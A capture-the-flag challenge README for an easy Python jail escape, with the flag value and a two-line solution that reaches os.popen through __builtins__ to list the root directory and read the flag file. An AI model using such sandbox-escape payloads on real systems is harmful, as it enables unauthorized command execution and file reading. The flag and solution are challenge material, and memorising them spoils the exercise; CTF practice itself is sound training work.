# Capital Jail easy

--------------------

### Description

**Difficulty:** easy

During the search for flags, you found yourself trapped in a strange jail. Can you escape?

```
nc some.server 1338
```

**Flag:** shadowctf{6b6e785964e63d2cb53ae878cc964cc1}

--------------------

### Solution

``` python
__builtins__.__import__("os").popen("ls /").read()
__builtins__.__import__("os").popen("cat /flag_3e0db8951b894a433bb147e9c250b6d5.txt").read()
```

--------------------

### Running

`docker-compose up`
